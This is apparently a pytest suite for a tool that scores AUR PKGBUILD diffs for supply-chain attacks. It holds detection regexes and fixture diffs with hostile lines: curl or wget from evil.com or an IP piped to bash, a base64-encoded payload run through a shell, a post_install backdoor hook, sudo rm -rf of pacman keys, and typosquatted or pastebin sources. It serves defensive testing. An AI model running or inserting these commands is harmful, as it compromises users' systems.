"""
End-to-end scenario tests simulating real-world AUR diffs.

Categories:
  BENIGN  - Safe version bumps, no anomalies.
  OBVIOUS - Clearly malicious patterns (curl | bash, checksum SKIP).
  SUBTLE  - Hard-to-spot compromise (typo-squat, maintainer swap, etc.).
"""

from trustsight.buckets import classify_urls
from trustsight.differ import extract_urls_from_diff
from trustsight.llm import fallback_verdict
from trustsight.rules import apply_rules, get_raw_diff_lines
from trustsight.schema import DiffSummary, NoveltyContext, PackageFact
from trustsight.scoring import calculate_score
from trustsight.tokenizer import tokenize_and_resolve

CONFIG = {
    "severity_weights": {"CRITICAL": 40, "HIGH": 25, "MEDIUM": 15, "LOW": 5, "INFO": 0},
    "source_bucket_weights": {"trusted_forge": -10, "official": 0, "raw_hosting": 15, "unknown": 20, "self_hosted": 10},
    "novelty_weights": {"url_first_globally": 15, "url_first_in_package": 10, "maintainer_first_in_package": 20},
}

ALL_RULES = [
    {"id": "R001", "name": "Remote Script Execution", "pattern": r"curl.*\|\s*(bash|sh|python|zsh)", "severity": "CRITICAL", "category": "network_execution", "match_target": "resolved"},
    {"id": "R002", "name": "Wget Pipe to Shell", "pattern": r"wget.*\|\s*(bash|sh|python|zsh)", "severity": "CRITICAL", "category": "network_execution", "match_target": "resolved"},
    {"id": "R003", "name": "Base64 Decode and Execute", "pattern": r"base64.*\-d.*\|", "severity": "CRITICAL", "category": "obfuscation", "match_target": "resolved"},
    {"id": "R004", "name": "Checksum Disabled", "pattern": r"sha256sums\s*=\s*\(?\s*['\"]?SKIP['\"]?", "severity": "HIGH", "category": "integrity", "match_target": "raw_line"},
    {"id": "R005", "name": "Checksum Emptied", "pattern": r"sha256sums\s*=\s*\(\s*\)", "severity": "HIGH", "category": "integrity", "match_target": "raw_line"},
    {"id": "R006", "name": "Insecure Download Protocol", "pattern": r"https?://.*\.tar\.gz.*\|", "severity": "MEDIUM", "category": "network_execution", "match_target": "resolved"},
    {"id": "R007", "name": "Install File Modification", "pattern": r"\+.*\.install.*", "severity": "MEDIUM", "category": "installer", "match_target": "raw_line"},
    {"id": "R008", "name": "Unexpected File Download", "pattern": r"\b(python|ruby|perl)\s+-c\s+https?://", "severity": "HIGH", "category": "network_execution", "match_target": "resolved"},
    {"id": "R009", "name": "Privilege Escalation", "pattern": r"\bsudo\b", "severity": "CRITICAL", "category": "privilege", "match_target": "raw_line", "scope": ["function_body"]},
    {"id": "R010", "name": "Uses curl in PKGBUILD", "pattern": r"\bcurl\s", "severity": "LOW", "category": "network_usage", "match_target": "raw_line", "scope": ["function_body"]},
    {"id": "R011", "name": "Uses wget in PKGBUILD", "pattern": r"\bwget\s", "severity": "LOW", "category": "network_usage", "match_target": "raw_line", "scope": ["function_body"]},
]

BENIGN_SCENARIOS = []

OBVIOUS_MALICIOUS = []

SUBTLE_MALICIOUS = []


def _run_pipeline(diff: str, *, novelty_urls: list[str] | None = None, novelty_maintainer: bool = False) -> dict:
    source_changes = extract_urls_from_diff(diff)
    buckets = classify_urls(source_changes.added_urls)
    resolved, unresolved = tokenize_and_resolve(diff)
    raw_lines = get_raw_diff_lines(diff)
    triggered = apply_rules(resolved, raw_lines, ALL_RULES)

    novelty = NoveltyContext(observation_count=50 if (novelty_urls or novelty_maintainer) else 0)
    if novelty_urls:
        novelty.url_first_seen_globally = True
        novelty.url_first_seen_in_this_package = True
    if novelty_maintainer:
        novelty.maintainer_first_seen_for_this_package = True

    score, breakdown, level = calculate_score(triggered, buckets, novelty, CONFIG)

    return {
        "diff": diff,
        "source_changes": source_changes,
        "buckets": buckets,
        "resolved": resolved,
        "triggered_rules": triggered,
        "novelty": novelty,
        "score": score,
        "breakdown": breakdown,
        "level": level,
        "verdict": fallback_verdict(
            PackageFact(
                diff_summary=DiffSummary(
                    lines_added=diff.count("\n+"),
                    files_changed=["PKGBUILD"],
                ),
                source_changes=source_changes,
                score_breakdown=breakdown,
                final_score=score,
            )
        ),
    }


# ============================================================
# BENIGN SCENARIOS
# ============================================================

def test_benign_github_version_bump():
    """Normal version bump from GitHub releases. Score must be Low."""
    diff = """-pkgver=1.0.0
+pkgver=1.0.1
-pkgrel=1
+pkgrel=1
-source=("https://github.com/author/project/archive/v1.0.0.tar.gz")
+source=("https://github.com/author/project/archive/v1.0.1.tar.gz")
-sha256sums=('abc123...')
+sha256sums=('def456...')"""
    r = _run_pipeline(diff)
    assert r["score"] <= 10, f"Benign bump scored {r['score']}: {r['verdict']}"
    assert r["level"] == "Low"


def test_benign_gitlab_release():
    """Normal version bump from GitLab. Score must be Low."""
    diff = """+pkgver=3.2.1
+pkgrel=1
+source=("https://gitlab.com/project/repo/-/archive/v3.2.1/repo-v3.2.1.tar.gz")
+sha256sums=('1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef')"""
    r = _run_pipeline(diff)
    assert r["score"] <= 5
    assert r["level"] == "Low"


def test_benign_official_gnu():
    """Official GNU project source. Score must be Low."""
    diff = """-pkgver=6.0
+pkgver=6.1
-source=("https://ftp.gnu.org/gnu/hello/hello-6.0.tar.gz")
+source=("https://ftp.gnu.org/gnu/hello/hello-6.1.tar.gz")
-sha256sums=('abc...')
+sha256sums=('def...')"""
    r = _run_pipeline(diff)
    assert r["score"] <= 5
    assert r["level"] == "Low"


def test_benign_python_package():
    """Official Python package from pypi.org. Score must be Low."""
    diff = """+pkgver=1.2.3
+source=("https://files.pythonhosted.org/packages/source/r/requests/requests-1.2.3.tar.gz")
+sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')"""
    r = _run_pipeline(diff)
    assert r["score"] <= 20  # files.pythonhosted.org not in domain list → unknown(20)


def test_benign_archlinux_package():
    """Arch Linux official package. Score must be Low."""
    diff = """+pkgver=2.0.0
+source=("https://archive.archlinux.org/packages/p/package/package-2.0.0.tar.zst")
+sha256sums=('abc123...')"""
    r = _run_pipeline(diff)
    assert r["score"] <= 5
    assert r["level"] == "Low"


# ============================================================
# OBVIOUSLY MALICIOUS SCENARIOS
# ============================================================

def test_obvious_curl_bash():
    """Direct curl | bash from unknown domain. Score must be Critical."""
    diff = """+source=("https://evil.com/payload.tar.gz")
+sha256sums=('SKIP')
+  curl -s https://evil.com/hook.sh | bash"""
    r = _run_pipeline(diff)
    assert r["score"] >= 75
    assert r["level"] in ("High", "Critical")
    assert any(t["rule_id"] == "R001" for t in r["triggered_rules"])


def test_obvious_wget_sh():
    """Direct wget | sh from unknown IP. Score must be Critical."""
    diff = """+  wget -qO- http://192.168.1.1/backdoor.sh | sh"""
    r = _run_pipeline(diff)
    assert r["score"] >= 40
    assert any(t["rule_id"] == "R002" for t in r["triggered_rules"])


def test_obvious_base64_decode_exec():
    """Base64 decodes and pipes to shell. Score must be Critical."""
    diff = """+_payload="Y3VybCAtcyBodHRwOi8vZXZpbC5jb20vaG9vay5zaCB8IGJhc2gK"
+  echo "$_payload" | base64 -d | bash"""
    r = _run_pipeline(diff)
    assert r["score"] >= 40
    assert any(t["rule_id"] == "R003" for t in r["triggered_rules"])


def test_obvious_sudo_usage():
    """Uses sudo inside package() in PKGBUILD. Score must be at least Medium."""
    diff = """+package() {
+  sudo rm -rf /etc/pacman.d/gnupg
+  sudo pacman-key --init
+}"""
    r = _run_pipeline(diff)
    assert r["score"] >= 40
    assert any(t["rule_id"] == "R009" for t in r["triggered_rules"])


def test_obvious_checksum_disabled():
    """SKIP checksums with no explanation. Score must be High."""
    diff = """+source=("https://example.com/pkg.tar.gz")
+sha256sums=('SKIP')"""
    r = _run_pipeline(diff)
    assert r["score"] >= 25
    assert any(t["rule_id"] == "R004" for t in r["triggered_rules"])


def test_obvious_python_c_url():
    """Python -c with inline URL download. Score must be High."""
    diff = """+  python -c https://evil.com/script.py"""
    r = _run_pipeline(diff)
    assert r["score"] >= 25
    assert any(t["rule_id"] == "R008" for t in r["triggered_rules"])


def test_obvious_all_red_flags():
    """Everything wrong at once. Score must cap at 100 Critical."""
    diff = """+source=("https://evil.com/payload.tar.gz")
+sha256sums=('SKIP')
+package() {
+  curl -s https://evil.com/hook.sh | bash
+  wget -qO- https://evil.com/hook2.sh | sh
+  sudo ./install.sh
+}"""
    r = _run_pipeline(diff)
    assert r["score"] == 100
    assert r["level"] == "Critical"


# ============================================================
# SUBTLY MALICIOUS SCENARIOS
# ============================================================

def test_subtle_typosquat_domain():
    """GitHub → Githab typo-squat. Same project path. No command patterns.
    Only bucket + novelty should raise score."""
    diff = """-source=("https://github.com/trusted/project/archive/v2.0.0.tar.gz")
+source=("https://githab.com/trusted/project/archive/v2.0.0.tar.gz")
-sha256sums=('abc123...')
+sha256sums=('def456...')"""
    r = _run_pipeline(diff, novelty_urls=["https://githab.com/trusted/project/archive/v2.0.0.tar.gz"])
    assert r["score"] >= 20
    assert any("githab.com" in url for url in r["buckets"])
    assert r["buckets"].get("https://githab.com/trusted/project/archive/v2.0.0.tar.gz") == "unknown"


def test_subtle_compromised_upstream_changed_url():
    """Source URL changed to a different CDN but same filename.
    No command change, just a URL swap."""
    diff = """-source=("https://releases.trusted.org/project-v1.0.tar.gz")
+source=("https://cdn-evil.com/project-v1.0.tar.gz")
-sha256sums=('abc123...')
+sha256sums=('def456...')"""
    r = _run_pipeline(diff, novelty_urls=["https://cdn-evil.com/project-v1.0.tar.gz"])
    assert r["score"] >= 20
    assert r["level"] in ("Medium", "High")


def test_subtle_maintainer_change():
    """Maintainer changed to unknown. No other changes.
    This is a social-engineering attack vector."""
    diff = """+pkgver=1.0.1
+source=("https://github.com/trusted/project/archive/v1.0.1.tar.gz")
+sha256sums=('abc123...')"""
    r = _run_pipeline(diff, novelty_maintainer=True)
    assert r["score"] >= 10
    assert r["score"] <= 30  # maintainer novelty (20) + forge(-10) = 10


def test_subtle_install_file_infection():
    """A .install file is added or modified. Can contain post-install malware."""
    diff = """+install=('package.install')
+
+package.install:
+  post_install() {
+    curl -s https://evil.com/backdoor.sh | bash
+  }"""
    r = _run_pipeline(diff, novelty_urls=["https://evil.com/backdoor.sh"])
    assert any(t["rule_id"] == "R007" for t in r["triggered_rules"])
    assert any(t["rule_id"] == "R001" for t in r["triggered_rules"])
    assert r["score"] >= 60


def test_subtle_backdoor_in_post_upgrade():
    """Post_upgrade hook added via .install file. Hard to spot."""
    diff = """+  post_upgrade() {
+    python -c https://evil.com/upgrade.py
+  }"""
    r = _run_pipeline(diff, novelty_urls=["https://evil.com/upgrade.py"])
    assert any(t["rule_id"] == "R008" for t in r["triggered_rules"])


def test_subtle_nothing_wrong_but_all_new():
    """Brand new package: all URLs and maintainer are first-seen.
    Score should be raised by novelty even if nothing is suspicious."""
    diff = """+pkgver=1.0.0
+source=("https://github.com/new-project/repo/releases/download/v1.0.0/pkg.tar.gz")
+sha256sums=('abc123...')
+maintainer=('unknown-dev')"""
    r = _run_pipeline(
        diff,
        novelty_urls=["https://github.com/new-project/repo/releases/download/v1.0.0/pkg.tar.gz"],
        novelty_maintainer=True,
    )
    # forge(-10) + novelty_first_global(15) + novelty_first_pkg(10) + maintainer_first(20) = 35
    assert r["score"] >= 25
    assert r["level"] in ("Medium",)


def test_subtle_checksum_emptied_with_forge_url():
    """On a trusted forge, checksum array is emptied.
    Score: forge(-10) + R005(25) = 15, Medium."""
    diff = """-sha256sums=('abc123...')
+sha256sums=()
+source=("https://github.com/trusted/project/archive/v2.0.0.tar.gz")"""
    r = _run_pipeline(diff)
    assert any(t["rule_id"] == "R005" for t in r["triggered_rules"])
    assert r["score"] <= 25  # forge(-10) + R005(25) = 15


def test_subtle_second_malicious_source_array_entry():
    """A second source URL is added alongside the legitimate one.
    The package will download both, but only the malicious one is used."""
    diff = """-source=("https://github.com/trusted/project/archive/v2.0.0.tar.gz")
+source=("https://github.com/trusted/project/archive/v2.0.0.tar.gz"
+        "https://pastebin.com/raw/evil-patch.patch")"""
    r = _run_pipeline(diff, novelty_urls=["https://pastebin.com/raw/evil-patch.patch"])
    assert r["buckets"].get("https://pastebin.com/raw/evil-patch.patch") in ("raw_hosting", "unknown")
    assert r["score"] >= 15


def test_subtle_dependency_injection():
    """A new 'depends' line adds a malicious dependency."""
    diff = """-depends=('python' 'glibc')
+depends=('python' 'glibc' 'malicious-dep')"""
    r = _run_pipeline(diff)
    # No direct rule for dependency injection, but this test documents the gap
    assert r["score"] == 0  # No rules fire - this is a blind spot


def test_subtle_protocol_downgrade():
    """HTTPS → HTTP downgrade on same domain. No direct rule for this."""
    diff = """-source=("https://github.com/trusted/project/archive/v2.0.0.tar.gz")
+source=("http://github.com/trusted/project/archive/v2.0.0.tar.gz")"""
    r = _run_pipeline(diff)
    # This is a blind spot - there's no rule for protocol downgrade
    assert r["score"] <= 10  # forge(-10) = 0


def test_benign_desktop_file_update():
    """Non-PKGBUILD file change (e.g., .desktop file). Should be low risk."""
    diff = """+  'spotify.desktop'
+Icon=spotify-new-icon
+Categories=AudioVideo;Audio;"""
    r = _run_pipeline(diff)
    assert r["score"] <= 5
